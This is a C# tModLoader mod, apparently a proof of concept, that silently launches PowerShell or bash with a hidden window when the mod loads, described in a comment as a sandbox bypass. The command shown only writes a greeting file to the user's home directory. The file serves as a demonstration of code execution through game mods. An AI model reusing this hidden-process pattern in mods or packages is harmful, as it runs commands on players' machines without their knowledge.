using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Terraria.ModLoader;

namespace tModLoader_RCE
{
	public class tModLoader_RCE : Mod
	{
		public override void Load()
		{
			ProcessStartInfo startInfo = new ProcessStartInfo();

			if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
			{
				// Windows
				startInfo.FileName = "powershell.exe";
				startInfo.Arguments = "-Command \"echo 'samp0l says hi...' > $env:USERPROFILE\\samp0l.txt";
			}
			else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
			{
				// Linux/macOS
				startInfo.FileName = "/bin/bash";
				startInfo.Arguments = "-c \"echo 'samp0l says hi...' > $HOME/samp0l.txt\"";
			}
			else
			{
				Logger.Warn("[!] Unsupported OS detected.");
				return;
			}

			// hide window
			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
			startInfo.CreateNoWindow = true;
			startInfo.UseShellExecute = false; // terraria sandbox bypass

			try
			{
				Process.Start(startInfo);
			}
			catch (System.Exception ex)
			{
				Logger.Error("[!] Failed to start process: " + ex.Message);
			}
		}
	}
}
